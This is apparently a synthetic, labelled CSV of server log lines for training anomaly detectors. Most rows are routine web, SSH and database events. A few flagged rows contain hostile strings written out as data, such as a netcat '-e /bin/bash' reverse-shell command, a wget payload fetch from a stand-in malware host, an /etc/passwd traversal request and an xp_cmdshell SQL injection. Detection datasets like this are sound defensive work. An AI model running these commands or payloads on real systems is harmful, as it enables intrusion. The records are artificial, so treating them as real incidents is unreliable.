timestamp,log_message,label,anomaly_type
2026-01-04 01:11:35,"192.168.63.168 - - [03/Jan/2026:17:51:07 +0700] ""POST /api/v1/data HTTP/1.1"" 200 47161",0,normal
2026-01-04 01:11:47,ALERT: Unauthorized privilege escalation attempt by postgres,1,privilege_escalation
2026-01-04 01:11:48,ALERT: Reverse shell connection attempt to 45.33.254.203:27861,1,malware_indicator
2026-01-04 01:11:50,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 01:11:56,Connection received: host=192.168.205.22 user=nginx database=users,0,normal
2026-01-04 01:11:58,"192.168.76.57 - - [04/Jan/2026:01:21:36 +0700] ""POST /admin HTTP/1.1"" 200 11271",0,normal
2026-01-04 01:12:12,[DEBUG] Processing request from 192.168.142.84,0,normal
2026-01-04 01:12:14,"192.168.60.239 - - [04/Jan/2026:06:34:14 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 01:12:16,"192.168.216.206 - - [03/Jan/2026:22:23:33 +0700] ""GET /dashboard HTTP/1.1"" 200 33592",0,normal
2026-01-04 01:12:17,Accepted password for admin from 192.168.240.143 port 26609 ssh2,0,normal
2026-01-04 01:12:33,"192.168.36.210 - - [04/Jan/2026:08:42:14 +0700] ""GET /api/v1/users HTTP/1.1"" 200 46623",0,normal
2026-01-04 01:12:39,"192.168.140.40 - - [04/Jan/2026:05:45:59 +0700] ""GET /images/logo.png HTTP/1.1"" 200 31161",0,normal
2026-01-04 01:12:42,Connection received: host=192.168.249.128 user=user database=test,0,normal
2026-01-04 01:12:44,ALERT: Rootkit signature detected in /dashboard,1,malware_indicator
2026-01-04 01:12:49,session closed for user admin,0,normal
2026-01-04 01:12:59,"192.168.44.239 - - [03/Jan/2026:18:24:19 +0700] ""GET /login HTTP/1.1"" 200 12039",0,normal
2026-01-04 01:13:03,"192.168.227.238 - - [04/Jan/2026:01:33:17 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 01:13:10,"192.168.159.45 - - [04/Jan/2026:09:37:45 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 01:13:16,session closed for user nginx,0,normal
2026-01-04 01:13:23,[INFO] Request processed in 2259ms,0,normal
2026-01-04 01:13:43,[INFO] Cache hit for key: cache_key_467,0,normal
2026-01-04 01:13:52,[INFO] Application started successfully,0,normal
2026-01-04 01:13:58,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:14:14,"192.168.33.62 - - [04/Jan/2026:03:13:15 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 01:14:18,Connection received: host=192.168.110.246 user=root database=production,0,normal
2026-01-04 01:14:22,session opened for user www-data by (uid=0),0,normal
2026-01-04 01:14:24,[DEBUG] Processing request from 192.168.18.244,0,normal
2026-01-04 01:14:30,Accepted password for nginx from 192.168.244.157 port 48578 ssh2,0,normal
2026-01-04 01:14:43,session opened for user nginx by (uid=0),0,normal
2026-01-04 01:14:49,[INFO] Application started successfully,0,normal
2026-01-04 01:14:52,Connection received: host=192.168.15.93 user=guest database=production,0,normal
2026-01-04 01:14:53,"192.168.206.25 - - [03/Jan/2026:15:49:52 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 01:14:56,[INFO] Cache hit for key: cache_key_908,0,normal
2026-01-04 01:15:10,"192.168.153.196 - - [04/Jan/2026:09:02:32 +0700] ""POST /images/logo.png HTTP/1.1"" 200 35155",0,normal
2026-01-04 01:15:49,[INFO] User apache logged in successfully,0,normal
2026-01-04 01:16:08,[INFO] Application started successfully,0,normal
2026-01-04 01:16:21,[INFO] Request processed in 4186ms,0,normal
2026-01-04 01:16:22,session closed for user postgres,0,normal
2026-01-04 01:16:27,Failed password for user from 185.220.146.211 port 13596 ssh2,1,brute_force
2026-01-04 01:16:28,ALERT: Rootkit signature detected in /admin,1,malware_indicator
2026-01-04 01:16:29,session closed for user apache,0,normal
2026-01-04 01:16:44,[INFO] Cache hit for key: cache_key_893,0,normal
2026-01-04 01:16:48,Accepted password for guest from 192.168.83.94 port 25270 ssh2,0,normal
2026-01-04 01:16:50,PAM: Authentication failure for mysql from 45.33.250.162,1,brute_force
2026-01-04 01:16:51,session closed for user user,0,normal
2026-01-04 01:16:52,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:17:02,"192.168.246.190 - - [03/Jan/2026:21:06:02 +0700] ""POST / HTTP/1.1"" 200 21566",0,normal
2026-01-04 01:17:03,MySQL server started with process id 15367,0,normal
2026-01-04 01:18:03,"192.168.39.142 - - [04/Jan/2026:09:14:53 +0700] ""POST /login HTTP/1.1"" 200 19904",0,normal
2026-01-04 01:18:18,Accepted password for root from 192.168.124.4 port 38617 ssh2,0,normal
2026-01-04 01:18:25,sudo: user : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=/bin/nc -e /bin/bash,1,privilege_escalation
2026-01-04 01:18:46,[INFO] Application started successfully,0,normal
2026-01-04 01:19:00,Received disconnect from 192.168.112.227 port 46675:11: disconnected by user,0,normal
2026-01-04 01:19:10,Received disconnect from 192.168.224.91 port 6735:11: disconnected by user,0,normal
2026-01-04 01:19:11,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:19:13,Received disconnect from 192.168.225.42 port 49153:11: disconnected by user,0,normal
2026-01-04 01:19:13,"192.168.156.160 - - [03/Jan/2026:18:58:07 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 01:19:14,Connection received: host=192.168.236.231 user=nginx database=test,0,normal
2026-01-04 01:19:29,[INFO] User user logged in successfully,0,normal
2026-01-04 01:19:43,PAM: Authentication failure for mysql from 185.220.198.227,1,brute_force
2026-01-04 01:20:00,session opened for user apache by (uid=0),0,normal
2026-01-04 01:20:00,Received disconnect from 192.168.57.9 port 60082:11: disconnected by user,0,normal
2026-01-04 01:20:04,[INFO] Cache hit for key: cache_key_423,0,normal
2026-01-04 01:20:05,Accepted password for user from 192.168.67.20 port 37661 ssh2,0,normal
2026-01-04 01:20:08,su: FAILED SU (to root) nginx on pts/0,1,privilege_escalation
2026-01-04 01:20:11,"192.168.90.202 - - [04/Jan/2026:13:38:41 +0700] ""GET /login HTTP/1.1"" 200 12314",0,normal
2026-01-04 01:20:38,[INFO] Request processed in 2985ms,0,normal
2026-01-04 01:20:44,kernel: [583.238579] docker0: link down,0,normal
2026-01-04 01:21:04,kernel: [450.479835] br-0: link up,0,normal
2026-01-04 01:21:13,Connection received: host=192.168.55.252 user=guest database=analytics,0,normal
2026-01-04 01:21:16,"192.168.60.107 - - [03/Jan/2026:14:29:26 +0700] ""GET /dashboard HTTP/1.1"" 200 48864",0,normal
2026-01-04 01:21:26,[DEBUG] Processing request from 192.168.73.155,0,normal
2026-01-04 01:21:29,[INFO] Request processed in 3559ms,0,normal
2026-01-04 01:21:30,"192.168.5.213 - - [04/Jan/2026:06:42:35 +0700] ""GET /index.html HTTP/1.1"" 304 0",0,normal
2026-01-04 01:21:36,MySQL server started with process id 36826,0,normal
2026-01-04 01:21:41,kernel: [141.552633] br-0: link down,0,normal
2026-01-04 01:21:41,kernel: Out of memory: Kill process 51651 (ransomware) score 862,1,system_error
2026-01-04 01:21:42,"192.168.194.176 - - [03/Jan/2026:21:17:53 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-04 01:22:01,postgres: user NOT in sudoers; TTY=pts/0; PWD=/home/postgres; USER=root; COMMAND=/bin/bash,1,privilege_escalation
2026-01-04 01:22:10,Connection received: host=192.168.198.158 user=apache database=analytics,0,normal
2026-01-04 01:22:22,MySQL server started with process id 9530,0,normal
2026-01-04 01:22:25,MySQL server started with process id 5605,0,normal
2026-01-04 01:22:45,Received disconnect from 192.168.73.142 port 12241:11: disconnected by user,0,normal
2026-01-04 01:23:07,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 01:23:54,Received disconnect from 192.168.187.61 port 61822:11: disconnected by user,0,normal
2026-01-04 01:23:56,"192.168.141.79 - - [04/Jan/2026:05:20:27 +0700] ""GET /api/v1/data HTTP/1.1"" 200 44886",0,normal
2026-01-04 01:23:59,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 01:24:02,Accepted password for user from 192.168.194.105 port 13784 ssh2,0,normal
2026-01-04 01:24:15,kernel: [894.667245] br-0: link up,0,normal
2026-01-04 01:24:43,Accepted password for guest from 192.168.186.192 port 18838 ssh2,0,normal
2026-01-04 01:24:44,kernel: [936.825452] wlan0: link down,0,normal
2026-01-04 01:24:47,[INFO] Application started successfully,0,normal
2026-01-04 01:25:01,[INFO] Request processed in 4392ms,0,normal
2026-01-04 01:25:07,[INFO] Cache hit for key: cache_key_191,0,normal
2026-01-04 01:25:27,"192.168.199.203 - - [03/Jan/2026:20:12:59 +0700] ""GET /api/v1/users HTTP/1.1"" 200 42968",0,normal
2026-01-04 01:25:28,session closed for user nginx,0,normal
2026-01-04 01:25:36,[INFO] Cache hit for key: cache_key_866,0,normal
2026-01-04 01:25:38,"192.168.189.8 - - [04/Jan/2026:12:59:43 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 01:25:40,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:25:44,MySQL server started with process id 3203,0,normal
2026-01-04 01:25:54,systemd[1]: Starting docker.service...,0,normal
2026-01-04 01:26:09,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:26:23,[INFO] Application started successfully,0,normal
2026-01-04 01:26:54,systemd[1]: Stopped cron.service,0,normal
2026-01-04 01:26:55,kernel: [409.257672] br-0: link up,0,normal
2026-01-04 01:27:07,[INFO] Cache hit for key: cache_key_942,0,normal
2026-01-04 01:27:19,Connection received: host=192.168.145.239 user=root database=production,0,normal
2026-01-04 01:27:23,Connection received: host=192.168.132.145 user=user database=users,0,normal
2026-01-04 01:27:29,session closed for user admin,0,normal
2026-01-04 01:27:31,"192.168.141.134 - - [04/Jan/2026:07:03:32 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 01:27:33,Accepted password for apache from 192.168.206.218 port 52409 ssh2,0,normal
2026-01-04 01:27:46,systemd[1]: Started apache2.service,0,normal
2026-01-04 01:28:38,[INFO] Request processed in 565ms,0,normal
2026-01-04 01:28:48,session opened for user www-data by (uid=0),0,normal
2026-01-04 01:29:04,session opened for user nginx by (uid=0),0,normal
2026-01-04 01:29:09,[INFO] Request processed in 822ms,0,normal
2026-01-04 01:29:20,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 01:29:29,[INFO] Cache hit for key: cache_key_460,0,normal
2026-01-04 01:29:39,Accepted password for guest from 192.168.6.170 port 1473 ssh2,0,normal
2026-01-04 01:29:44,su: FAILED SU (to root) nginx on pts/0,1,privilege_escalation
2026-01-04 01:29:45,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:30:11,systemd[1]: Starting redis.service...,0,normal
2026-01-04 01:30:33,Received disconnect from 192.168.245.66 port 58440:11: disconnected by user,0,normal
2026-01-04 01:30:37,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 01:30:55,[INFO] Request processed in 862ms,0,normal
2026-01-04 01:31:05,su: FAILED SU (to root) admin on pts/0,1,privilege_escalation
2026-01-04 01:31:13,kernel: [160.455660] eth1: link down,0,normal
2026-01-04 01:31:17,[INFO] Cache hit for key: cache_key_468,0,normal
2026-01-04 01:31:28,session opened for user www-data by (uid=0),0,normal
2026-01-04 01:31:35,systemd[1]: Starting mysql.service...,0,normal
2026-01-04 01:31:50,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 01:32:07,MySQL server started with process id 47740,0,normal
2026-01-04 01:32:12,[INFO] Application started successfully,0,normal
2026-01-04 01:32:37,PAM: Authentication failure for postgres from 45.33.1.7,1,brute_force
2026-01-04 01:33:02,systemd[1]: Stopped mysql.service,0,normal
2026-01-04 01:33:04,[DEBUG] Processing request from 192.168.20.138,0,normal
2026-01-04 01:33:36,[INFO] Request processed in 569ms,0,normal
2026-01-04 01:33:50,Received disconnect from 192.168.119.27 port 3188:11: disconnected by user,0,normal
2026-01-04 01:33:52,[DEBUG] Processing request from 192.168.63.14,0,normal
2026-01-04 01:33:53,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 01:33:54,[INFO] Request processed in 436ms,0,normal
2026-01-04 01:34:03,[INFO] User admin logged in successfully,0,normal
2026-01-04 01:34:07,"45.33.72.139 - - [03/Jan/2026:14:05:33 +0700] ""GET /admin HTTP/1.1"" 403 33548",1,suspicious_network
2026-01-04 01:34:07,Failed password for invalid user postgres from 185.220.144.225 port 1987 ssh2,1,brute_force
2026-01-04 01:34:08,"192.168.199.62 - - [04/Jan/2026:04:56:41 +0700] ""POST /images/logo.png HTTP/1.1"" 200 35142",0,normal
2026-01-04 01:34:12,"192.168.60.145 - - [04/Jan/2026:13:30:11 +0700] ""GET /images/logo.png HTTP/1.1"" 200 2140",0,normal
2026-01-04 01:34:35,[DEBUG] Processing request from 192.168.111.205,0,normal
2026-01-04 01:34:42,Accepted password for nginx from 192.168.208.53 port 3770 ssh2,0,normal
2026-01-04 01:34:45,systemd[1]: Started docker.service,0,normal
2026-01-04 01:34:52,[INFO] Request processed in 268ms,0,normal
2026-01-04 01:35:01,Received disconnect from 192.168.57.169 port 9253:11: disconnected by user,0,normal
2026-01-04 01:35:02,Blocked suspicious request from 45.33.143.184: /index.html,1,suspicious_network
2026-01-04 01:35:11,[INFO] Application started successfully,0,normal
2026-01-04 01:35:14,MySQL server started with process id 31207,0,normal
2026-01-04 01:35:40,[DEBUG] Processing request from 192.168.181.73,0,normal
2026-01-04 01:35:53,[INFO] Application started successfully,0,normal
2026-01-04 01:36:06,Connection received: host=192.168.230.133 user=apache database=test,0,normal
2026-01-04 01:36:08,systemd[1]: ssh.service failed,1,system_error
2026-01-04 01:36:25,session opened for user mysql by (uid=0),0,normal
2026-01-04 01:36:45,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 01:36:47,"192.168.94.180 - - [04/Jan/2026:04:48:01 +0700] ""GET /index.html HTTP/1.1"" 200 30350",0,normal
2026-01-04 01:36:47,"192.168.22.41 - - [03/Jan/2026:22:18:33 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 01:37:01,systemd[1]: Starting redis.service...,0,normal
2026-01-04 01:37:18,[INFO] Application started successfully,0,normal
2026-01-04 01:37:27,systemd[1]: Started redis.service,0,normal
2026-01-04 01:38:01,"192.168.81.210 - - [03/Jan/2026:21:15:04 +0700] ""GET /css/style.css HTTP/1.1"" 304 0",0,normal
2026-01-04 01:38:22,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:38:23,"192.168.18.124 - - [03/Jan/2026:14:42:21 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 23785",0,normal
2026-01-04 01:38:26,Accepted password for nginx from 192.168.6.37 port 25699 ssh2,0,normal
2026-01-04 01:38:38,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:38:46,Connection received: host=192.168.54.48 user=admin database=production,0,normal
2026-01-04 01:38:58,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:38:59,systemd[1]: Started postgresql.service,0,normal
2026-01-04 01:39:04,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 01:39:04,Connection received: host=192.168.80.60 user=www-data database=analytics,0,normal
2026-01-04 01:39:19,[DEBUG] Processing request from 192.168.238.37,0,normal
2026-01-04 01:39:24,[INFO] Request processed in 626ms,0,normal
2026-01-04 01:39:25,Received disconnect from 192.168.24.187 port 60738:11: disconnected by user,0,normal
2026-01-04 01:39:45,MySQL server started with process id 30376,0,normal
2026-01-04 01:40:00,kernel: [558.703772] wlan0: link up,0,normal
2026-01-04 01:40:01,"192.168.219.201 - - [04/Jan/2026:04:10:40 +0700] ""GET /api/v1/users HTTP/1.1"" 304 0",0,normal
2026-01-04 01:40:34,DDoS attack detected from 192.42.183.109 - rate limit exceeded,1,suspicious_network
2026-01-04 01:41:01,Accepted password for mysql from 192.168.17.126 port 16579 ssh2,0,normal
2026-01-04 01:41:02,Connection received: host=192.168.249.22 user=root database=production,0,normal
2026-01-04 01:41:04,[INFO] User www-data logged in successfully,0,normal
2026-01-04 01:41:14,"192.42.41.32 - - [03/Jan/2026:16:26:37 +0700] ""GET /admin HTTP/1.1"" 403 21243",1,suspicious_network
2026-01-04 01:41:53,[INFO] Cache hit for key: cache_key_83,0,normal
2026-01-04 01:41:54,kernel: Out of memory: Kill process 31578 (ransomware) score 785,1,system_error
2026-01-04 01:42:12,kernel: [43.975078] wlan0: link down,0,normal
2026-01-04 01:42:18,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:42:30,[INFO] Cache hit for key: cache_key_405,0,normal
2026-01-04 01:42:32,systemd[1]: Starting apache2.service...,0,normal
2026-01-04 01:42:33,Received disconnect from 192.168.10.64 port 63352:11: disconnected by user,0,normal
2026-01-04 01:42:48,systemd[1]: Starting ssh.service...,0,normal
2026-01-04 01:42:50,"192.168.173.197 - - [03/Jan/2026:16:01:33 +0700] ""GET /css/style.css HTTP/1.1"" 200 36976",0,normal
2026-01-04 01:42:52,[INFO] Application started successfully,0,normal
2026-01-04 01:43:05,"192.168.188.73 - - [04/Jan/2026:11:37:30 +0700] ""POST /login HTTP/1.1"" 200 19985",0,normal
2026-01-04 01:43:15,session opened for user postgres by (uid=0),0,normal
2026-01-04 01:43:23,[DEBUG] Processing request from 192.168.237.29,0,normal
2026-01-04 01:43:45,[DEBUG] Processing request from 192.168.215.122,0,normal
2026-01-04 01:43:52,kernel: [157.425448] eth0: link down,0,normal
2026-01-04 01:44:01,"192.168.40.225 - - [04/Jan/2026:11:05:19 +0700] ""GET /images/logo.png HTTP/1.1"" 200 47566",0,normal
2026-01-04 01:44:10,"192.168.227.95 - - [04/Jan/2026:04:33:15 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 01:44:10,"192.168.100.161 - - [04/Jan/2026:09:16:14 +0700] ""GET /api/v1/data HTTP/1.1"" 200 37497",0,normal
2026-01-04 01:44:19,"192.168.187.154 - - [03/Jan/2026:19:35:32 +0700] ""POST / HTTP/1.1"" 200 31381",0,normal
2026-01-04 01:44:49,"192.168.15.162 - - [03/Jan/2026:17:41:57 +0700] ""GET /login HTTP/1.1"" 200 22386",0,normal
2026-01-04 01:45:05,MySQL server started with process id 23110,0,normal
2026-01-04 01:45:06,MySQL server started with process id 20192,0,normal
2026-01-04 01:45:11,"185.220.251.152 - - [04/Jan/2026:11:59:00 +0700] ""GET /admin HTTP/1.1"" 403 27366",1,suspicious_network
2026-01-04 01:45:17,[INFO] User user logged in successfully,0,normal
2026-01-04 01:45:52,[INFO] User mysql logged in successfully,0,normal
2026-01-04 01:45:54,systemd[1]: Started redis.service,0,normal
2026-01-04 01:46:03,"192.168.141.16 - - [04/Jan/2026:02:58:56 +0700] ""POST /api/v1/data HTTP/1.1"" 200 20112",0,normal
2026-01-04 01:46:16,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 01:46:38,Accepted password for www-data from 192.168.151.161 port 64271 ssh2,0,normal
2026-01-04 01:46:55,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 01:47:06,Received disconnect from 192.168.15.192 port 3777:11: disconnected by user,0,normal
2026-01-04 01:47:09,ALERT: Suspicious process detected: reverse_shell (PID: 3633),1,malware_indicator
2026-01-04 01:47:12,Received disconnect from 192.168.32.169 port 58369:11: disconnected by user,0,normal
2026-01-04 01:47:18,Connection received: host=192.168.38.15 user=apache database=test,0,normal
2026-01-04 01:47:20,[DEBUG] Processing request from 192.168.62.66,0,normal
2026-01-04 01:47:33,"192.168.155.251 - - [04/Jan/2026:08:11:28 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 01:47:40,[INFO] Cache hit for key: cache_key_661,0,normal
2026-01-04 01:47:59,session closed for user root,0,normal
2026-01-04 01:48:20,systemd[1]: Started nginx.service,0,normal
2026-01-04 01:48:26,kernel: [399.418320] docker0: link up,0,normal
2026-01-04 01:48:26,WARNING: Cryptominer activity detected on process 25415,1,malware_indicator
2026-01-04 01:48:46,kernel: [866.445234] eth0: link up,0,normal
2026-01-04 01:48:53,Possible SQL injection attack from 185.220.23.237: 1; EXEC xp_cmdshell,1,suspicious_network
2026-01-04 01:49:25,systemd[1]: Started mysql.service,0,normal
2026-01-04 01:49:51,Connection received: host=192.168.77.246 user=root database=staging,0,normal
2026-01-04 01:49:51,[DEBUG] Processing request from 192.168.192.192,0,normal
2026-01-04 01:49:56,ALERT: Reverse shell connection attempt to 185.220.154.180:28973,1,malware_indicator
2026-01-04 01:50:14,ALERT: Suspicious process detected: reverse_shell (PID: 55139),1,malware_indicator
2026-01-04 01:50:21,systemd[1]: Starting postgresql.service...,0,normal
2026-01-04 01:50:26,sudo: user : command not allowed ; TTY=pts/0 ; USER=root ; COMMAND=wget http://malware.com/payload,1,privilege_escalation
2026-01-04 01:50:28,"192.168.172.168 - - [03/Jan/2026:15:26:48 +0700] ""GET /dashboard HTTP/1.1"" 304 0",0,normal
2026-01-04 01:50:56,systemd[1]: Started docker.service,0,normal
2026-01-04 01:50:57,[INFO] Application started successfully,0,normal
2026-01-04 01:51:13,systemd[1]: Started nginx.service,0,normal
2026-01-04 01:51:32,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 01:51:33,"192.168.189.97 - - [04/Jan/2026:06:07:17 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-04 01:51:33,Connection received: host=192.168.236.11 user=admin database=users,0,normal
2026-01-04 01:51:38,"192.168.11.143 - - [04/Jan/2026:03:20:23 +0700] ""GET /login HTTP/1.1"" 304 0",0,normal
2026-01-04 01:51:39,kernel: Out of memory: Kill process 62516 (ransomware) score 567,1,system_error
2026-01-04 01:51:42,"192.168.93.237 - - [03/Jan/2026:15:51:24 +0700] ""POST /api/v1/users HTTP/1.1"" 200 49664",0,normal
2026-01-04 01:51:51,kernel: [196.897038] docker0: link up,0,normal
2026-01-04 01:51:52,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 01:51:57,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 01:51:59,[DEBUG] Processing request from 192.168.248.207,0,normal
2026-01-04 01:52:09,[INFO] Request processed in 4914ms,0,normal
2026-01-04 01:52:19,"192.168.41.109 - - [03/Jan/2026:23:31:16 +0700] ""GET /static/js/app.js HTTP/1.1"" 304 0",0,normal
2026-01-04 01:52:20,WARNING: Cryptominer activity detected on process 60307,1,malware_indicator
2026-01-04 01:52:23,[INFO] Cache hit for key: cache_key_604,0,normal
2026-01-04 01:52:33,systemd[1]: Stopped postgresql.service,0,normal
2026-01-04 01:52:38,[INFO] Cache hit for key: cache_key_279,0,normal
2026-01-04 01:52:57,[INFO] Request processed in 2948ms,0,normal
2026-01-04 01:53:10,session closed for user guest,0,normal
2026-01-04 01:53:22,session opened for user user by (uid=0),0,normal
2026-01-04 01:53:42,session closed for user user,0,normal
2026-01-04 01:53:46,kernel: [807.355175] eth0: link up,0,normal
2026-01-04 01:53:55,"192.168.8.104 - - [04/Jan/2026:10:36:41 +0700] ""POST /css/style.css HTTP/1.1"" 200 6621",0,normal
2026-01-04 01:54:18,systemd[1]: Starting nginx.service...,0,normal
2026-01-04 01:54:26,Received disconnect from 192.168.66.176 port 18077:11: disconnected by user,0,normal
2026-01-04 01:54:45,"185.220.220.51 - - [03/Jan/2026:22:56:21 +0700] ""GET /../../../etc/passwd HTTP/1.1"" 400 46901",1,suspicious_network
2026-01-04 01:54:52,[DEBUG] Processing request from 192.168.164.230,0,normal
2026-01-04 01:55:01,kernel: [116.422839] docker0: link down,0,normal
2026-01-04 01:55:07,session closed for user www-data,0,normal
2026-01-04 01:55:11,session opened for user postgres by (uid=0),0,normal
2026-01-04 01:55:11,[INFO] Cache hit for key: cache_key_227,0,normal
2026-01-04 01:55:14,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:55:22,[DEBUG] Processing request from 192.168.42.247,0,normal
2026-01-04 01:55:28,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 01:55:34,[INFO] Cache hit for key: cache_key_975,0,normal
2026-01-04 01:55:41,"192.168.245.125 - - [03/Jan/2026:17:09:17 +0700] ""POST /static/js/app.js HTTP/1.1"" 200 49734",0,normal
2026-01-04 01:55:44,[INFO] User admin logged in successfully,0,normal
2026-01-04 01:56:08,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:56:44,session opened for user nginx by (uid=0),0,normal
2026-01-04 01:56:57,systemd[1]: Stopped nginx.service,0,normal
2026-01-04 01:57:01,[INFO] User apache logged in successfully,0,normal
2026-01-04 01:57:07,[INFO] Application started successfully,0,normal
2026-01-04 01:57:11,"192.168.91.26 - - [03/Jan/2026:21:38:02 +0700] ""GET /admin HTTP/1.1"" 304 0",0,normal
2026-01-04 01:58:19,MySQL server started with process id 4149,0,normal
2026-01-04 01:58:22,ALERT: Rootkit signature detected in /login,1,malware_indicator
2026-01-04 01:58:26,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 01:58:27,"192.168.241.154 - - [03/Jan/2026:14:20:44 +0700] ""GET /images/logo.png HTTP/1.1"" 304 0",0,normal
2026-01-04 01:58:50,Received disconnect from 192.168.137.152 port 41437:11: disconnected by user,0,normal
2026-01-04 01:58:57,session closed for user root,0,normal
2026-01-04 01:58:57,[INFO] Cache hit for key: cache_key_276,0,normal
2026-01-04 01:59:53,[INFO] User postgres logged in successfully,0,normal
2026-01-04 01:59:58,MySQL server started with process id 2238,0,normal
2026-01-04 02:00:14,systemd[1]: Started cron.service,0,normal
2026-01-04 02:00:15,Accepted password for mysql from 192.168.201.116 port 33176 ssh2,0,normal
2026-01-04 02:00:20,session closed for user user,0,normal
2026-01-04 02:00:37,Failed password for postgres from 185.220.89.61 port 45619 ssh2,1,brute_force
2026-01-04 02:00:38,"192.168.95.103 - - [03/Jan/2026:23:29:20 +0700] ""GET /api/v1/data HTTP/1.1"" 304 0",0,normal
2026-01-04 02:00:38,PostgreSQL database system is ready to accept connections,0,normal
2026-01-04 02:00:44,kernel: [275.757878] docker0: link up,0,normal
2026-01-04 02:00:45,[INFO] User admin logged in successfully,0,normal
2026-01-04 02:00:49,MySQL server started with process id 36110,0,normal
2026-01-04 02:00:51,systemd[1]: Stopped ssh.service,0,normal
2026-01-04 02:00:52,[INFO] Application started successfully,0,normal
2026-01-04 02:00:54,[DEBUG] Processing request from 192.168.146.202,0,normal
2026-01-04 02:00:55,session closed for user mysql,0,normal
2026-01-04 02:00:55,Accepted password for www-data from 192.168.180.64 port 60364 ssh2,0,normal
2026-01-04 02:00:59,Received disconnect from 192.168.61.24 port 3898:11: disconnected by user,0,normal
2026-01-04 02:01:07,systemd[1]: Stopped mongodb.service,0,normal
2026-01-04 02:01:11,kernel: [964.970286] wlan0: link down,0,normal
2026-01-04 02:01:16,[INFO] Cache hit for key: cache_key_31,0,normal
2026-01-04 02:01:20,systemd[1]: Stopped cron.service,0,normal
2026-01-04 02:01:31,Accepted password for postgres from 192.168.20.139 port 48732 ssh2,0,normal
2026-01-04 02:01:42,systemd[1]: Starting docker.service...,0,normal
2026-01-04 02:01:44,[DEBUG] Processing request from 192.168.42.46,0,normal
2026-01-04 02:01:46,[INFO] Request processed in 3038ms,0,normal
2026-01-04 02:01:54,[INFO] Request processed in 1129ms,0,normal
2026-01-04 02:01:58,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 02:02:00,systemd[1]: Stopped apache2.service,0,normal
2026-01-04 02:02:03,Connection received: host=192.168.167.210 user=www-data database=production,0,normal
2026-01-04 02:02:10,[INFO] Application started successfully,0,normal
2026-01-04 02:02:20,Connection received: host=192.168.143.55 user=user database=analytics,0,normal
